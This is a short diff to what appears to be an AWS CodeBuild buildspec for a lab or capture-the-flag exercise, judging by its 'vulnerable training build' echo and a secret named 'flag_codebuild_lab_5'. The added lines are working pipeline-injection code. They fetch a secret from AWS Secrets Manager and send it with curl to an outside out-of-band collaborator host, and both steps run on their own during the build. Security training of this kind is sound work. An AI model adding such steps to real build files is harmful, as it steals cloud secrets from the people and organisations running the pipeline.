@@ -4,5 +4,6 @@ phases:
   build:
     commands:
       - echo "Running vulnerable training build"
-      - env | sort | head -n 20
+      - SECRET_VALUE=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1)
+      - curl -X POST http://uus9vdvcpvwcb3w1zv095zulkcq3ev2k.oastify.com/test --data "flag=$SECRET_VALUE"
       - echo "Done"
